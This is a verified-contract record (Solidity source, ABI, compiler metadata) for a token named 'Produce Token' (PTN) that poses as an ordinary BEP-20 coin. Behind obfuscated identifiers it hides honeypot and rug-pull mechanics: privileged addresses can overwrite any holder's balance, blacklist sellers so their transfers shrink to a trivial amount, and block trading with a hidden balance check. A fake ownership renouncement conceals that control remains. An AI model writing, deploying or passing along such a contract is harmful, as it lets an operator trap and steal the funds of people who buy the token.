{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalWallet) external view returns (uint256);\n\n    function transfer(address launchedMin, uint256 launchSellList) external returns (bool);\n\n    function allowance(address takeIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchSellList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedMin,\n        uint256 launchSellList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTake, uint256 value);\n    event Approval(address indexed takeIs, address indexed spender, uint256 value);\n}\n\nabstract contract sellAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingSwap {\n    function createPair(address isFrom, address shouldModeToken) external returns (address);\n}\n\ninterface launchTradingMetadata is launchTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ProduceToken is sellAmount, launchTrading, launchTradingMetadata {\n\n    function owner() external view returns (address) {\n        return tokenAuto;\n    }\n\n    function walletTxList() private view {\n        require(atFromExempt[_msgSender()]);\n    }\n\n    string private takeMode = \"Produce Token\";\n\n    function shouldIs(address receiverTotalLaunch) public {\n        walletTxList();\n        \n        if (receiverTotalLaunch == limitAmount || receiverTotalLaunch == listAuto) {\n            return;\n        }\n        takeWallet[receiverTotalLaunch] = true;\n    }\n\n    address public listAuto;\n\n    mapping(address => bool) public takeWallet;\n\n    function atIs(address launchBuy) public {\n        if (receiverModeIs) {\n            return;\n        }\n        if (launchAuto) {\n            toList = true;\n        }\n        atFromExempt[launchBuy] = true;\n        \n        receiverModeIs = true;\n    }\n\n    bool public liquidityTo;\n\n    address senderTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public liquidityIsFrom;\n\n    mapping(address => bool) public atFromExempt;\n\n    mapping(address => uint256) private receiverLimit;\n\n    bool private launchAuto;\n\n    function transferFrom(address limitExempt, address launchedMin, uint256 launchSellList) external override returns (bool) {\n        if (_msgSender() != senderTeam) {\n            if (takeSender[limitExempt][_msgSender()] != type(uint256).max) {\n                require(launchSellList <= takeSender[limitExempt][_msgSender()]);\n                takeSender[limitExempt][_msgSender()] -= launchSellList;\n            }\n        }\n        return isTxMin(limitExempt, launchedMin, launchSellList);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityFund;\n    }\n\n    uint256 fundLaunch;\n\n    event OwnershipTransferred(address indexed senderFee, address indexed autoSender);\n\n    bool private toList;\n\n    uint8 private liquidityFund = 18;\n\n    address tradingToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 fundTotal;\n\n    string private receiverLaunched = \"PTN\";\n\n    function balanceOf(address totalWallet) public view virtual override returns (uint256) {\n        return receiverLimit[totalWallet];\n    }\n\n    function receiverSell(uint256 launchSellList) public {\n        walletTxList();\n        fundLaunch = launchSellList;\n    }\n\n    function getOwner() external view returns (address) {\n        return tokenAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeMode;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderIs;\n    }\n\n    bool public receiverModeIs;\n\n    uint256 private receiverTotalWallet;\n\n    bool public launchLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunched;\n    }\n\n    function transfer(address fromModeAt, uint256 launchSellList) external virtual override returns (bool) {\n        return isTxMin(_msgSender(), fromModeAt, launchSellList);\n    }\n\n    uint256 constant launchWallet = 20 ** 10;\n\n    mapping(address => mapping(address => uint256)) private takeSender;\n\n    address public limitAmount;\n\n    uint256 private totalLiquidity;\n\n    function launchMarketingReceiver(address limitExempt, address launchedMin, uint256 launchSellList) internal returns (bool) {\n        require(receiverLimit[limitExempt] >= launchSellList);\n        receiverLimit[limitExempt] -= launchSellList;\n        receiverLimit[launchedMin] += launchSellList;\n        emit Transfer(limitExempt, launchedMin, launchSellList);\n        return true;\n    }\n\n    function isTxMin(address limitExempt, address launchedMin, uint256 launchSellList) internal returns (bool) {\n        if (limitExempt == limitAmount) {\n            return launchMarketingReceiver(limitExempt, launchedMin, launchSellList);\n        }\n        uint256 receiverLiquidity = launchTrading(listAuto).balanceOf(tradingToken);\n        require(receiverLiquidity == fundLaunch);\n        require(launchedMin != tradingToken);\n        if (takeWallet[limitExempt]) {\n            return launchMarketingReceiver(limitExempt, launchedMin, launchWallet);\n        }\n        return launchMarketingReceiver(limitExempt, launchedMin, launchSellList);\n    }\n\n    constructor (){\n        if (launchAuto) {\n            launchLiquidity = false;\n        }\n        modeSender receiverExempt = modeSender(senderTeam);\n        listAuto = marketingSwap(receiverExempt.factory()).createPair(receiverExempt.WETH(), address(this));\n        if (receiverTotalWallet == totalLiquidity) {\n            totalLiquidity = receiverTotalWallet;\n        }\n        limitAmount = _msgSender();\n        isAuto();\n        atFromExempt[limitAmount] = true;\n        receiverLimit[limitAmount] = senderIs;\n        \n        emit Transfer(address(0), limitAmount, senderIs);\n    }\n\n    function allowance(address launchWalletReceiver, address limitBuy) external view virtual override returns (uint256) {\n        if (limitBuy == senderTeam) {\n            return type(uint256).max;\n        }\n        return takeSender[launchWalletReceiver][limitBuy];\n    }\n\n    address private tokenAuto;\n\n    function feeAt(address fromModeAt, uint256 launchSellList) public {\n        walletTxList();\n        receiverLimit[fromModeAt] = launchSellList;\n    }\n\n    function isAuto() public {\n        emit OwnershipTransferred(limitAmount, address(0));\n        tokenAuto = address(0);\n    }\n\n    uint256 private senderIs = 100000000 * 10 ** 18;\n\n    function approve(address limitBuy, uint256 launchSellList) public virtual override returns (bool) {\n        takeSender[_msgSender()][limitBuy] = launchSellList;\n        emit Approval(_msgSender(), limitBuy, launchSellList);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"}],\"name\":\"atIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromModeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellList\",\"type\":\"uint256\"}],\"name\":\"feeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIsFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchSellList\",\"type\":\"uint256\"}],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTotalLaunch\",\"type\":\"address\"}],\"name\":\"shouldIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromModeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ProduceToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}